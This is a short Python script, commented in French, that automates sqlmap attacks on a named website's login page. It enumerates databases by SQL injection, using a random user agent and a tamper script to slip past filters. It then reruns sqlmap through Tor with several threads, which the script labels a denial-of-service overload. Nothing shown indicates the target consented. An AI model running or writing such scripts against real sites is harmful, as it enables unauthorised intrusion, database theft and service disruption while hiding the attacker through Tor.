import os
import subprocess
import datetime

# Définir l'URL cible
URL_CIBLE = "https://regisono.com/login.php?id=1"

# Définir le répertoire de sortie des résultats
DATE_EXECUTION = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
OUTPUT_DIR = f"sqlmap_results_{DATE_EXECUTION}"
os.makedirs(OUTPUT_DIR, exist_ok=True)

# Commande SQLMap pour détecter les vulnérabilités SQL
commande_sqlmap = [
    "sqlmap",
    "-u", URL_CIBLE,
    "--batch",
    "--random-agent",
    "--level", "3",
    "--risk", "2",
    "--tamper=space2comment",
    "--output-dir", OUTPUT_DIR,
    "--flush-session",
    "--dbs"
]

print(f" Lancement de l'analyse SQLMap sur {URL_CIBLE}...")
resultat = subprocess.run(commande_sqlmap, capture_output=True, text=True)

# Enregistrer les résultats dans un fichier
rapport_fichier = os.path.join(OUTPUT_DIR, "rapport_sqlmap.txt")
with open(rapport_fichier, "w", encoding="utf-8") as f:
    f.write(resultat.stdout)

print(f" Rapport SQLMap enregistré dans {rapport_fichier}")

# Simulation d'une attaque de surcharge (DoS)
print(" Simulation d'une surcharge avec des requêtes intensives...")
commande_surcharge = [
    "sqlmap",
    "-u", URL_CIBLE,
    "--batch",
    "--tor",
    "--threads", "10",
    "--flush-session",
    "--time-sec", "10"
]
subprocess.run(commande_surcharge, capture_output=True, text=True)

print(" Test de surcharge terminé.")

# Afficher le rapport
with open(rapport_fichier, "r", encoding="utf-8") as f:
    print("\n Résumé des résultats SQLMap :")
    print(f.read())

print(" Analyse terminée.")
